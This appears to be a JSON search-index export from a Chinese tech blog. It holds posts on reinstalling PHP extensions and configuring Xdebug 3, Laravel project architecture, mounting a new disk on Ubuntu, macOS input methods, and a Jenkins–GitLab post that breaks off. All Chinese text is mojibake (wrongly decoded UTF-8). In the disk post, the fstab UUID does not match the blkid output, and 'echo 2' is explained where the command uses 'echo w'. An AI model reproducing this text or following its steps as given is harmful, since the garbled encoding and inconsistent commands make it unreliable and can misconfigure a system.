ç¼–è¯‘å®‰è£…è¿‡çš„æ‰©å±•ï¼Œè¿˜éœ€è¦å†å®‰è£…ä¸€æ¬¡ã€‚ ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦å†å®‰è£…ä¸€æ¬¡å‘¢ï¼Ÿç›´æ¥æŠŠphp.ini ä¸­çš„å¼€å¯æ‰©å±•é…æ‹·è´è¿‡å»ä¸å°±å¯ä»¥äº†å—ï¼Ÿ æˆ‘ä»¬æ¥è¯•è¯•è¿™æ ·åšä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å¯ä»¥çœ‹åˆ° PHP å¹¶æ²¡æœ‰æ­£å¸¸åŠ è½½è¯¥æ‰©å±•ï¼Œè¿™æ˜¯ä¸ºå•¥å‘¢ï¼Ÿ è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ææ¸…æ¥šï¼Œæºç ç¼–è¯‘å®‰è£…æ˜¯æ€ä¹ˆå›äº‹ã€‚ å½“æˆ‘ä»¬æ‰§è¡Œphpize å‘½ä»¤åï¼Œä¼šæ ¹æ®å½“å‰ç³»ç»Ÿä¿¡æ¯ï¼ˆPHP ç‰ˆæœ¬ï¼‰ç”Ÿæˆå¯¹åº”ç‰ˆæœ¬çš„æ‰©å±•æ–‡ä»¶ã€‚ æ‰€ä»¥PHP7.3 ç¼–è¯‘ç”Ÿæˆçš„æ‰©å±•è‡ªç„¶å°±ä¸èƒ½ç›´æ¥æ‹¿åˆ°PHP 7.4 ä¸­å»ä½¿ç”¨äº†ã€‚ xdebugå¦å¤–æƒ³è¯´ä¸€ä¸‹Xdebug ï¼Œå®ƒæ˜¯æˆ‘ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€ä¸ªè°ƒè¯•æ‰©å±•ï¼Œéå¸¸å¼ºå¤§ã€‚ åœ¨PHP å‡èµ·åˆ°7.4 ä¹‹åï¼Œæˆ‘ä¸€å¹¶å®‰è£…äº†æœ€æ–°ç‰ˆçš„Xdebugï¼ˆ3.xï¼‰ï¼Œæ­¤å‰æˆ‘ä¸€ç›´ä½¿ç”¨ 2.x ç‰ˆæœ¬çš„ï¼Œå› ä¸ºç‰ˆæœ¬è·¨åº¦æ¯”è¾ƒå¤§ï¼Œåˆšå¼€å§‹é—®é¢˜æŒºå¤šçš„ï¼Œæ–­ç‚¹æ€»æ˜¯è¿›ä¸å»ã€‚ èµ·åˆæˆ‘è®¤ä¸ºæ˜¯æ–°æ—§é…ç½®ä¸å…¼å®¹ï¼ŒæŒºå¤šå‚æ•°åç§°å‘ç”Ÿäº†å˜åŒ–ï¼Œï¼ˆå…·ä½“å¯ä»¥çœ‹è¿™é‡Œï¼‰ï¼Œå½“æˆ‘æŠŠé…ç½®å…¨éƒ¨åˆ‡æ¢æˆé€‚åº”æ–°ç‰ˆæœ¬ï¼Œè¿˜æ˜¯è¿›ä¸å»ã€‚ åæ¥é˜´å·®é˜³é”™å‡çº§äº†PHPStormï¼Œç»“æœå°±èƒ½è°ƒè¯•äº†â€¦ï¼ˆå‡çº§ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ 2020.1ï¼‰ é€‚åº”xdebug 3.xçš„é…ç½®å¦‚ä¸‹ï¼š 123456[XDebug]zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pecl&#x2F;20190902&#x2F;xdebug.soxdebug.mode &#x3D; debugxdebug.client_host &#x3D; 127.0.0.1xdebug.client_port &#x3D; 9003xdebug.idekey&#x3D;PHPSTORM åªæ˜¯åˆ°æœ€åæˆ‘ä¹Ÿæ²¡æ•´æ˜ç™½åˆ°åº•æ˜¯å•¥åŸå› å¯¼è‡´ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"ã€è½¬è½½ã€Laravel ä¸­å¤§å‹é¡¹ç›®æ¶æ„","slug":"laravel-medium-and-large-project-architecture","date":"2021-03-30T15:59:36.000Z","updated":"2021-03-30T16:00:43.872Z","comments":true,"path":"laravel-medium-and-large-project-architecture/","link":"","permalink":"https://www.0x2beace.com/laravel-medium-and-large-project-architecture/","excerpt":"åˆå­¦è€…å­¦ä¹  Laravel æ—¶åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¹–ä¹–çš„å°†ç¨‹å¼å¡«å…¥ MVC æ¶æ„å…§ï¼Œå¯¼è‡´ controller ä¸ model å¼‚å¸¸çš„è‚¥å¤§ï¼Œæ—¥åä¸€æ ·å¾ˆéš¾ç»´æŠ¤ï¼›ä¸€ç§æ˜¯å¸¸å¸¸ä¸çŸ¥é“ç¨‹å¼æ”¹å†™åœ¨å“ªä¸€ä¸ª class å…§è€ŒçŠ¹è±«ä¸æ±ºï¼Œæ¯•ç«Ÿä¼ ç»Ÿ PHP éƒ½æ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªæ¡£æ¡ˆã€‚æœ¬æ–‡æ•´ç†å‡ºé€‚åˆ Laravel çš„ä¸­å¤§å‹é¡¹ç›®æ¶æ„ï¼Œå…¼å…·å®¹æ˜“ç»´æŠ¤ã€å®¹æ˜“æ‰©å……ä¸å®¹æ˜“é‡å¤ä½¿ç”¨çš„ç‰¹ç‚¹ï¼Œå¹¶ä¸”å®¹æ˜“æµ‹è¯•ã€‚","text":"åˆå­¦è€…å­¦ä¹  Laravel æ—¶åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¹–ä¹–çš„å°†ç¨‹å¼å¡«å…¥ MVC æ¶æ„å…§ï¼Œå¯¼è‡´ controller ä¸ model å¼‚å¸¸çš„è‚¥å¤§ï¼Œæ—¥åä¸€æ ·å¾ˆéš¾ç»´æŠ¤ï¼›ä¸€ç§æ˜¯å¸¸å¸¸ä¸çŸ¥é“ç¨‹å¼æ”¹å†™åœ¨å“ªä¸€ä¸ª class å…§è€ŒçŠ¹è±«ä¸æ±ºï¼Œæ¯•ç«Ÿä¼ ç»Ÿ PHP éƒ½æ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªæ¡£æ¡ˆã€‚æœ¬æ–‡æ•´ç†å‡ºé€‚åˆ Laravel çš„ä¸­å¤§å‹é¡¹ç›®æ¶æ„ï¼Œå…¼å…·å®¹æ˜“ç»´æŠ¤ã€å®¹æ˜“æ‰©å……ä¸å®¹æ˜“é‡å¤ä½¿ç”¨çš„ç‰¹ç‚¹ï¼Œå¹¶ä¸”å®¹æ˜“æµ‹è¯•ã€‚ ä¸€ä¸ªé¡¹ç›®åªæœ‰ MVC æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬éœ€è¦æ›´å®Œæ•´çš„é¡¹ç›®æ¶æ„ã€‚ Controller è¿‡äºè‡ƒè‚¿å—RoRçš„å½±å“ï¼Œåˆå­¦è€…å¸¸è®¤ä¸º MVC æ¶æ„å°±æ˜¯ model ,view,controller : Model å°±æ˜¯èµ„æ–™åº“ã€‚ Controller è´Ÿè´£ä¸ HTTP äº¤äº’ï¼Œè°ƒç”¨ model ä¸ viewã€‚ View å°±æ˜¯ HTMLã€‚ å‡å¦‚ä¾ç…§è¿™ä¸ªå®šä¹‰ï¼Œä»¥ä¸‹è¿™äº›éœ€æ±‚æ”¹å†™åœ¨å“ªé‡Œå‘¢ï¼Ÿ å‘é€ Emailï¼Œä½¿ç”¨å¤–éƒ¨ APIã€‚ ä½¿ç”¨ PHP å†™çš„é€»è¾‘ã€‚ ä¾éœ€æ±‚å°†æ˜¾ç¤ºæ ¼å¼ä½œè½¬æ¢ã€‚ ä¾éœ€æ±‚æ˜¯å¦æ˜¾ç¤ºæŸäº›èµ„æ–™ã€‚ ä¾éœ€æ±‚æ˜¾ç¤ºä¸åŒèµ„æ–™ã€‚ å…¶ä¸­ 1, 2 å±äºå•†ä¸šé€»è¾‘ï¼Œè€Œ 3, 4, 5 å±äºæ˜¾ç¤ºé€»è¾‘ï¼Œè‹¥ä¾ç…§ä¸€èˆ¬äººå¯¹ MVC çš„å®šä¹‰ï¼Œmodel æ˜¯èµ„æ–™åº“ï¼Œè€Œ view åˆæ˜¯ HTMLï¼Œä»¥ä¸Šè¿™äº›éœ€æ±‚éƒ½ä¸èƒ½å†™åœ¨ model ä¸ viewï¼Œåªèƒ½å‹‰å¼ºå†™åœ¨ controllerã€‚ å› æ­¤åˆå­¦è€…å¼€å§‹å°†å¤§é‡ç¨‹å¼å†™åœ¨ controllerï¼Œé€ æˆ controller çš„è‚¥å¤§éš¾ä»¥ç»´æŠ¤ã€‚ Model è¿‡äºè‡ƒè‚¿æ—¢ç„¶é€»è¾‘å†™åœ¨ controller ä¸æ–¹ä¾¿ç»´æŠ¤ï¼Œé‚£æˆ‘å°†é€»è¾‘éƒ½å†™åœ¨ model å°±å¥½äº†ï¼Ÿ å½“ä½ å°†é€»è¾‘ä» controller æ¬åˆ° model åï¼Œè™½ç„¶ controller å˜ç˜¦äº†ï¼Œä½†å´è‚¥äº† modelï¼Œmodel ä»åŸæœ¬ä»£è¡¨èµ„æ–™åº“ï¼Œç¾åœ¨å˜æˆè¿˜è¦è´Ÿè´£å•†ä¸šé€»è¾‘ä¸æ˜¾ç¤ºé€»è¾‘ï¼Œç»“æœæ›´æ…˜ã€‚ Model ä»£è¡¨èµ„æ–™åº“å—ï¼ŸæŠŠå®ƒæƒ³æˆæ˜¯ Eloquent classå°±å¥½ï¼Œèµ„æ–™åº“é€»è¾‘åº”è¯¥å†™åœ¨ repository é‡Œï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Laravel 5 å·²ç»æ²’æœ‰ modelsç›®å½•ï¼ŒEloquent class ä»…ä»…æ˜¯æ”¾åœ¨ app æ ¹ç›®å½•ä¸‹è€Œå·²ã€‚ ä¸­å¤§å‹é¡¹ç›®æ¶æ„é‚£æˆ‘ä»¬æ”¹æ€ä¹ˆå†™å‘¢ï¼Ÿåˆ¥å°†æˆ‘ä»¬çš„æ€ç»´å±€é™åœ¨ MVC å…§ : Model : ä»…å½“æˆ Eloquent classã€‚ Repository : è¾…åŠ© modelï¼Œå¤„ç†èµ„æ–™åº“é€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° serviceã€‚ Service : è¾…åŠ© controllerï¼Œå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° controllerã€‚ Controller : æ¥æ”¶ HTTP requestï¼Œè°ƒç”¨å…¶ä»– serviceã€‚ Presenter : å¤„ç†æ˜¾ç¤ºé€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° viewã€‚ View : ä½¿ç”¨ blade å°†èµ„æ–™ ç»‘å®š åˆ° HTMLã€‚ ä¸Šé¢æ¶æ„æˆ‘ä»¬å¯ä»¥å‘ç° MVC æ¶æ„è¿˜åœ¨ï¼Œç”±ä¸ SOLID çš„å•ä¸€èŒè´£åŸå‰‡ä¸ä¾èµ–åè½¬åŸåˆ™: æˆ‘ä»¬å°†èµ„æ–™åº“é€»è¾‘ä» model åˆ†ç¦»å‡ºæ¥ï¼Œç”± repository è¾…åŠ© modelï¼Œå°† model ä¾èµ–æ³¨å…¥è¿› repositoryã€‚æˆ‘ä»¬å°†å•†ä¸šé€»è¾‘ä» controller åˆ†ç¦»å‡ºæ¥ï¼Œç”± service è¾…åŠ© controllerï¼Œå°† service ä¾èµ–æ³¨å…¥è¿› controllerã€‚æˆ‘å€‘å°†æ˜¾ç¤ºé€»è¾‘ä» view åˆ†ç¦»å‡ºä¾†ï¼Œç”± presenter è¾…åŠ© viewï¼Œå°† presenter ä¾èµ–æ³¨å…¥è¿› viewã€‚ å»ºç«‹ç›®å½•åœ¨ app ç›®å½•ä¸‹å»ºç«‹ Repositoriesï¼ŒServices ä¸ Presenters ç›®å½•ã€‚ åˆ¥å®³æ€•å»ºç«‹ç›®å½•ï¼ï¼ åˆ¥å®³æ€•åœ¨ Laravel é¢„è®¾ç›®å½•ä»¥å¤–å»ºç«‹çš„å…¶ä»–ç›®å½•ï¼Œæ ¹æ® SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼Œclass åŠŸèƒ½è¶Šå¤šï¼Œè´£ä»»ä¹Ÿè¶Šå¤šï¼Œå› æ­¤è¶Šè¿åå•ä¸€èŒè´£åŸåˆ™ï¼Œæ‰€ä»¥ä½ åº”è¯¥å°†ä½ çš„ç¨‹å¼åˆ†å‰²æˆæ›´å°çš„éƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰å®ƒä¸“å±çš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯ä¸€ä¸ª class åŠŸèƒ½åŒ…å±±åŒ…æµ·ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¸‡èƒ½ç±»åˆ«ï¼Œæ‰€ä»¥æ•´ä¸ªæ–¹æ¡ˆä¸åº”è¯¥åªæœ‰ MVC ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæ”¾æ‰‹æ ¹æ®ä½ çš„éœ€æ±‚å»ºç«‹é€‚å½“çš„ç›®å½•ï¼Œå¹¶å°†é€‚å½“çš„ class æ”¾åˆ°è¯¥ç›®å½•ä¸‹ï¼Œåªè¦æˆ‘ä»¬çš„ class æœ‰ namespace å¸®æˆ‘ä»¬åˆ†ç±»å³å¯ã€‚ Repositoryç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† repository ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Repository æ¨¡å¼? Serviceç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† service ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Service æ¨¡å¼? Presenterç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† presenter ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Presenter æ¨¡å¼? å•å…ƒæµ‹è¯•ç”±äºç°åœ¨ modelã€viewã€controller çš„ç›¸ä¾ç‰©ä»¶éƒ½å·²ç»æ‹†å¼€ï¼Œä¹Ÿéƒ½ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼Œå› æ­¤æ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥å•ç‹¬çš„åšå•å…ƒæµ‹è¯•ï¼Œå¦‚è¦æµ‹è¯• serviceï¼Œå°±å°† repository åŠ ä»¥ mockï¼Œä¹Ÿå¯ä»¥å°†å…¶ä»– service åŠ ä»¥ mockã€‚ Presenter ä¹Ÿå¯ä»¥å•ç‹¬è·‘å•å…ƒæµ‹è¯•ï¼Œå°†å…¶ä»– service åŠ ä»¥ mockï¼Œä¸ä¸€å®šè¦è·‘éªŒæ”¶æµ‹è¯•æ‰èƒ½æµ‹è¯•æ˜¾ç¤ºé€»è¾‘ã€‚ Conclusionæœ¬æ–‡è°ˆåˆ°çš„æ¶æ„åªæ˜¯å¼€å§‹å¼€å§‹ï¼Œä½ å¯ä»¥ä¾ç…§å®é™…éœ€æ±‚å¢åŠ æ›´å¤šçš„ç›®å½•ä¸ classï¼Œå½“ä½ å‘ç°ä½ çš„ MVC è¿å SOLID åŸåˆ™æ—¶ï¼Œå°±å¤§èƒ†çš„å°† class ä» MVC æ‹†å¼€é‡æ„ï¼Œç„¶åä¾ç…§ä»¥ä¸‹æ‰‹æ³• : å»ºç«‹æ–°çš„ class æˆ– interfaceã€‚ å°†ç›¸ä¾ç‰©ä»¶ä¾èµ–æ³¨å…¥åˆ° classã€‚ åœ¨ class å…§å¤„ç†ä»–çš„èŒè´£ã€‚ å°† class æˆ– interface æ³¨å…¥åˆ° controller æˆ– viewã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œåå°”è¡—ä¹‹çŒ«ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_24935119/article/details/89656569","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux å¦‚ä½•æŒ‚è½½æ–°ç¡¬ç›˜","slug":"how-to-mount-a-new-hard-disk-in-linux","date":"2021-03-25T14:40:48.000Z","updated":"2021-03-25T14:42:08.365Z","comments":true,"path":"how-to-mount-a-new-hard-disk-in-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-mount-a-new-hard-disk-in-linux/","excerpt":"å¦‚ä½•å°†ä¸€å—æ–°çš„ç¡¬ç›˜æŒ‚è½½åˆ°Linux æ“ä½œç³»ç»Ÿå‘¢ï¼Ÿ","text":"å¦‚ä½•å°†ä¸€å—æ–°çš„ç¡¬ç›˜æŒ‚è½½åˆ°Linux æ“ä½œç³»ç»Ÿå‘¢ï¼Ÿ ä¸‹é¢ä»¥Ubuntu 18.04çš„å‘è¡Œç‰ˆä½œä¸ºæ¼”ç¤ºã€‚ é¦–å…ˆæŸ¥çœ‹ç³»ç»Ÿå½“å‰ç¡¬ç›˜åˆ†é…æƒ…å†µï¼š 1$ cd &#x2F;dev &amp;&amp; ls sd* -al é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç¡¬ç›˜æ ‡è®°ä¸º/dev/sdaï¼Œsda1ã€sda2è¿™äº›è¡¨ç¤ºå¯¹åº”ç¡¬ç›˜ä¸‹çš„åˆ†åŒºåç§°ã€‚ æŸ¥çœ‹å½“å‰ç³»ç»Ÿç¡¬ç›˜æŒ‚è½½æƒ…å†µï¼š 1$ df -h å¯ä»¥åˆ°çœ‹ï¼Œè¯¥ç³»ç»Ÿå½“å‰ä¸€å…±æŒ‚è½½äº†ä¸¤å—ç¡¬ç›˜ï¼Œåˆ†åˆ«æ˜¯ï¼š åˆ†åŒºåç§°ä¸º /dev/sda2çš„ç³»ç»Ÿç›˜ 10Gï¼ŒæŒ‚è½½ç‚¹ä¸º/ã€‚ åˆ†åŒºåç§°ä¸º /dev/sdb1çš„ä¸´æ—¶ç›˜ 2.5Gï¼ŒæŒ‚è½½ç‚¹ä¸º/mydataã€‚ ç°åœ¨æ¥ä¸ºè¯¥ç³»ç»Ÿæ·»åŠ ç¬¬ä¸‰å—ç¡¬ç›˜ï¼Œå¹¶å°è¯•æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ã€‚ VirtualBox æ·»åŠ ç£ç›˜æ·»åŠ ç¡¬ç›˜ä¹‹å‰ï¼Œéœ€è¦å…ˆå°†æœºå™¨ç»™åœæ‰ï¼Œå³é”®è®¾ç½®ï¼Œç‚¹å‡»å­˜å‚¨ åˆ›å»ºè™šæ‹Ÿç›˜ï¼š æŒ‰ç…§é»˜è®¤é€‰æ‹©VDI å°±å¥½ï¼š æ ¹æ®è‡ªèº«æƒ…å†µï¼Œé€‰æ‹©åŠ¨æ€åˆ†é…æˆ–è€…å›ºå®šå¤§å° è¿™é‡Œé€‰æ‹©åˆ†é…ä¸‰ä¸ªGï¼Œç„¶åç‚¹å‡»åˆ›å»ºã€‚ å°†æ–°ç¡¬ç›˜åŠ å…¥è¿›æ¥ï¼Œç„¶åå¯åŠ¨æœºå™¨ã€‚ åˆ†åŒºè¿æ¥ä¸Šæœºå™¨ä¹‹åï¼Œå†æ¬¡æŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿç¡¬ç›˜ï¼š å¯ä»¥çœ‹åˆ°è¿™æ¬¡å¤šäº†ä¸€ä¸ªå«åšsdc çš„ç¡¬ç›˜ï¼Œé¦–å…ˆéœ€è¦å¯¹è¯¥ç¡¬ç›˜è¿›è¡Œåˆ†åŒºï¼Œç„¶åæ‰èƒ½æŒ‚è½½ã€‚ è¿™é‡Œæˆ‘åªéœ€è¦æ–°å¢ä¸€ä¸ªä¸»åˆ†åŒºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1$ (echo n; echo p; echo 1; echo ; echo ; echo w) | sudo fdisk &#x2F;dev&#x2F;sdc è¿™æ¡å‘½ä»¤æœ€ç»ˆä¼šåšä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š echo n æ–°å¢åˆ†åŒº echo p æ–°å»ºä¸»åˆ†åŒº echo 1 æ–°å¢ä¸€ä¸ªä¸»åˆ†åŒº echo è¡¨ç¤ºã€å›è½¦ã€ç¡®å®š echo 2 å†™å…¥å¹¶é€€å‡º å°†ä»¥ä¸Šè¾“å‡ºä½œä¸ºè¾“å‡ºé€šè¿‡ç®¡é“ç¬¦ä¼ é€’ç»™fdiskå‘½ä»¤ /dev/sdc è¡¨ç¤ºéœ€è¦åˆ†åŒºçš„ç¡¬ç›˜ å°†æ–‡ä»¶ç³»ç»Ÿå†™å…¥åˆ†åŒºï¼š 1sudo mkfs -t ext4 &#x2F;dev&#x2F;sdc1 æŒ‚è½½ç¡¬ç›˜å°†æ–°ç¡¬ç›˜æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ï¼š 1$ sudo mkdir &#x2F;boo &amp;&amp; sudo mount &#x2F;dev&#x2F;sdc1 &#x2F;boo å†æ¬¡ä½¿ç”¨df -hå‘½ä»¤æŸ¥çœ‹ç£ç›˜æƒ…å†µï¼Œå¯ä»¥åˆ°çœ‹æ–°ç¡¬ç›˜å·²ç»æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ä¸‹äº†ã€‚ æœ€åè®°å¾—è®¾ç½®å¼€æœºæŒ‚è½½ï¼Œä½¿ç”¨blkid å‘½ä»¤è·å–ç¡¬ç›˜UUIDï¼š 1$ sudo -i blkid è¾“å‡ºå†…å®¹ç±»ä¼¼ï¼š 1&#x2F;dev&#x2F;sdc1: UUID&#x3D;&quot;f8025940-19bc-4943-9711-b431f478838e&quot; TYPE&#x3D;&quot;ext4&quot; PARTUUID&#x3D;&quot;d746a3a1-01&quot; ç¼–è¾‘/etc/fstab æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1UUID&#x3D;9da67a01-aaae-4979-93fd-9916f010731a &#x2F;boo ext4 defaults 0 0 è‡³æ­¤å°±å®Œæˆäº†ç¡¬ç›˜æŒ‚è½½çš„æ‰€æœ‰æ“ä½œäº†ã€‚ å‚è€ƒé“¾æ¥ è™šæ‹ŸæœºVirtualBoxæ€ä¹ˆæ·»åŠ æ–°çš„è™šæ‹Ÿç¡¬ç›˜ Azure: ç»™ ubuntu è™šæœºæŒ‚è½½æ•°æ®ç›˜","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac å¦‚ä½•åªä¿ç•™ä¸€ä¸ªè¾“å…¥æ³•","slug":"how-to-keep-only-one-input-method-on-mac","date":"2021-03-20T01:27:00.000Z","updated":"2021-03-21T03:33:10.032Z","comments":true,"path":"how-to-keep-only-one-input-method-on-mac/","link":"","permalink":"https://www.0x2beace.com/how-to-keep-only-one-input-method-on-mac/","excerpt":"macOS é»˜è®¤è‡ªå¸¦çš„æ˜¯è‹±æ–‡è¾“å…¥æ³•ï¼Œè™½ç„¶ä¹Ÿæœ‰ç®€ä½“ä¸­æ–‡ï¼Œä¸è¿‡è¯åº“ä¸ä¸°å¯Œï¼Œä¸å¤ªå¥½ç”¨ã€‚ä¸€èˆ¬ä¼šé€‰æ‹©å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„è¾“å…¥æ³•ï¼Œè¿™æ—¶å°±ä¼šæœ‰ä¸¤ä¸ªè¾“å…¥æ³•å…±å­˜äº†ã€‚","text":"macOS é»˜è®¤è‡ªå¸¦çš„æ˜¯è‹±æ–‡è¾“å…¥æ³•ï¼Œè™½ç„¶ä¹Ÿæœ‰ç®€ä½“ä¸­æ–‡ï¼Œä¸è¿‡è¯åº“ä¸ä¸°å¯Œï¼Œä¸å¤ªå¥½ç”¨ã€‚ä¸€èˆ¬ä¼šé€‰æ‹©å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„è¾“å…¥æ³•ï¼Œè¿™æ—¶å°±ä¼šæœ‰ä¸¤ä¸ªè¾“å…¥æ³•å…±å­˜äº†ã€‚ å¸¸å¸¸ä¼šé‡åˆ°çš„ä¸€ä¸ªç—›ç‚¹å°±æ˜¯å¤šåº”ç”¨åˆ‡æ¢æ—¶ï¼Œä¸‹ä¸€ä¸ªè¾“å…¥æ³•æ€»æ˜¯ä¸ç¡®å®šï¼Œæœ‰æ—¶å€™æ˜¯ä¸­æ–‡æœ‰æ—¶å€™æ˜¯è‹±æ–‡ã€‚ ç³»ç»Ÿè¾“å…¥æ³•åˆ‡æ¢çš„å¿«æ·æ–¹å¼æ˜¯Control + Spaceï¼Œè€Œè½æ ¼è¾“å…¥æ³•åˆ‡æ¢ä¸­è‹±æ–‡åˆæ˜¯Shiftï¼Œè¿™å°±å¯¼è‡´æ€»æ˜¯éœ€è¦æ¥å›åˆ‡æ¢ï¼Œè¿™ä¸€ç‚¹å°±å¾ˆçƒ¦ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœåªä¿ç•™ä¸€ä¸ªè¾“å…¥æ³•ï¼Œé‚£å°±ä¸ä¼šæœ‰è¿™ç§å›°æ‰°äº†ã€‚ ä½†æ˜¯ç³»ç»Ÿå¹¶ä¸å…è®¸æˆ‘ä»¬åˆ é™¤é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³•ï¼Œä¸è¿‡å¯ä»¥ä¸€äº›å°æ‰‹æ®µæ¥è¾¾åˆ°ç›®çš„ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š åˆ é™¤å¤šä½™çš„è¾“å…¥æ³•ï¼Œåªä¿ç•™é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³•å’Œæ­£åœ¨ä½¿ç”¨çš„è¾“å…¥æ³• æŠŠå½“å‰è¾“å…¥æ³•åˆ‡æ¢åˆ°é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³• æŠŠ~/Library/Preferences/è·¯å¾„ä¸‹çš„com.apple.HIToolbox.plistæ–‡ä»¶æ‹·è´åˆ°æ¡Œé¢ï¼Œç”¨Xcode æ‰“å¼€ï¼Œæ‰¾åˆ°å¹¶åˆ é™¤AppleEnabledInputSourcesä¸­KeyboardLayout Nameä¸ºUS é‚£ä¸€é¡¹ï¼Œç„¶åä¿å­˜ã€‚ ç”¨ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢~/Library/Preferences/è·¯å¾„ä¸‹æ–‡ä»¶ é‡å¯ç”µè„‘å³å¯ å‚è€ƒé“¾æ¥ åˆ é™¤macOSè‡ªå¸¦çš„è‹±æ–‡è¾“å…¥æ³•","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Jenkins + Gitlab æŒç»­é›†æˆ","slug":"jenkins-gitlab-continuous-integration","date":"2021-03-16T14:27:42.000Z","updated":"2021-03-17T14:56:26.907Z","comments":true,"path":"jenkins-gitlab-continuous-integration/","link":"","permalink":"https://www.0x2beace.com/jenkins-gitlab-continuous-integration/","excerpt":"Jenkins æ˜¯ä»€ä¹ˆï¼Ÿ Jenkinsæ˜¯ä¸€ä¸ªå¼€æºçš„ã€æä¾›å‹å¥½æ“ä½œç•Œé¢çš„æŒç»­é›†æˆ(CI)å·¥å…·ã€‚","text":"Jenkins æ˜¯ä»€ä¹ˆï¼Ÿ Jenkinsæ˜¯ä¸€ä¸ªå¼€æºçš„ã€æä¾›å‹å¥½æ“ä½œç•Œé¢çš„æŒç»­é›†æˆ(CI)å·¥å…·ã€‚ Jenkins å¦‚ä½•ä¸Gitlab è¿›è¡Œå…³è”ï¼Ÿ å¯ä»¥é€šè¿‡ç”Ÿæˆå¯†é’¥ï¼ˆWebhooks çš„é’©å­ï¼‰ï¼Œç„¶ååˆ°Gitlab 